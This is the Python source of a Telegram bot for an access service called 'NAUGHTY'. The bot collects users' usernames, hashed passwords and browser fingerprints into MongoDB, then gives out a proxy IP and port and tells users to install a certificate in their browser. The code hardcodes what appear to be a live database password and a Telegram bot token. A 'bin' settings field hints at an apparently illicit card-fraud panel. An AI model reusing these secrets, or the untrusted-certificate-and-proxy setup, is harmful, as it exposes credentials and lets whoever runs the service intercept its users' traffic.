import logging
import nest_asyncio
import asyncio
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ConversationHandler, ContextTypes
from pymongo import MongoClient
from bson.objectid import ObjectId
import os
nest_asyncio.apply()
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO
)
logger = logging.getLogger(__name__)

client = MongoClient('mongodb+srv://freephalistine0011:2YyorEGIaM6vGqxw@cluster0.1szgu.mongodb.net/')
db = client['naughty']
collection = db['db']

USERNAME, PASSWORD, FINGERPRINT = range(3)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_id = update.message.from_user.id
    
    with open("user_ids.txt", "a") as file:
        file.write(f"{user_id}\n")
    
    await update.message.reply_text(
        "Welcome Buddy! Here are the available commands for ℕ𝔸𝕌𝔾ℍ𝕋𝕐:\n\n"
        "/help - Get Admin Help Support\n"
        "/register - Register\n"
        "/serverinfo - Get Server Login Details\n"
        "/sendfile -  To get the Certificate File"
    )
    
    return ConversationHandler.END

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Here @Naughtyxd to get fast help support")

async def send_certificate(update: Update) -> None:
    """Helper function to send the certificate file."""
    file_path = ""
    try:
        if os.path.exists(file_path):
            await update.message.reply_document(InputFile(file_path, filename=""))
        else:
            logger.error("Use /sendfile to get Certificate Files")
            await update.message.reply_text('Use /sendfile to get Certificate Files')
    except Exception as e:
        logger.error(f"Failed to send file: {e}")
        await update.message.reply_text('Failed to send the file.')

async def serverinfo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text(
        "Server Login Details ✅\n\n"
        "IP - 2.58.56.214\n\nPORT - 8081\n\n"
        "Install Oxylabs Proxy Extension in Browser\n\n\n After Install and Set IP and port are set and the proxy is active, use this Website: https://naughty/\n\n"
        "👇👇 Get Certificate Files Commands Here 👇👇"
    )
    await send_certificate(update)

async def register(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text('Please enter your username:')
    return USERNAME

async def username(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['username'] = update.message.text
    await update.message.reply_text(
        "https://naughty.dev/getcreds/ \n\nGo and get your Hash password & Fingerprint and When you Get your Hash Password, \n\nSend Me Your Hash Password Please......"
    )
    return PASSWORD

async def password(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['password'] = update.message.text
    await update.message.reply_text('Now Please Enter Your Fingerprint Also:')
    return FINGERPRINT

async def fingerprint(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    context.user_data['fingerprint'] = update.message.text

    # Create the document
    document = {
        "_id": ObjectId(),
        "username": context.user_data['username'],
        "password": context.user_data['password'],
        "fingerprint": context.user_data['fingerprint'],
        "ip": "",
        "settings": {
            "bin": "",
            "proxy": "",
            "logs": ["green:green:HEY BUDDY WELCOME TO ℕ𝔸𝕌𝔾ℍ𝕋𝕐"]
        },
        "role": "free",
        "bot_login": "False",
        "rate_limit": {
            "count": 0,
            "last_attempt": {"$date": "2024-07-15T16:40:45.701Z"}
        }
    }

    try:
        collection.insert_one(document)
        await update.message.reply_text(
            "Registration successful! Enjoy ℕ𝔸𝕌𝔾ℍ𝕋𝕐-XD ✅\n\n"
            "Server Login Details Here ✅\n\n"
            "IP - 2.58.56.214\n\nPORT - 8081\n\n"
            "Install Oxylabs Proxy Extension in Browser\n\n After Install and Set IP and port are set and the proxy is active, use this \n\nWebsite:--  https://naughty/\n\n"
            "👇👇 Here is the Certificate of ℕ𝔸𝕌𝔾ℍ𝕋𝕐-XD  add This into Browser 👇👇"
        )
        await send_certificate(update)
    except Exception as e:
        logger.error(f"An error occurred: {e}")
        await update.message.reply_text('An error occurred while saving your data.')

    return ConversationHandler.END

FILE_PATH = 'naughty.crt'

async def send_file(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.message.chat_id
    await context.bot.send_document(chat_id=chat_id, document=open(FILE_PATH, 'rb'))

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text('Operation cancelled.')
    return ConversationHandler.END

def main() -> None:
    application = ApplicationBuilder().token("7347436181:AAGs5s2J5Nf2ezaBFbMBiGQsze7HCoDWTKM").build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('register', register)],
        states={
            USERNAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, username)],
            PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, password)],
            FINGERPRINT: [MessageHandler(filters.TEXT & ~filters.COMMAND, fingerprint)],
        },
        fallbacks=[CommandHandler('cancel', cancel)],
    )

    application.add_handler(conv_handler)
    application.add_handler(CommandHandler('start', start))
    application.add_handler(CommandHandler('help', help_command))
    application.add_handler(CommandHandler('serverinfo', serverinfo))
    application.add_handler(CommandHandler("sendfile", send_file))

    application.run_polling()

if __name__ == '__main__':
    main()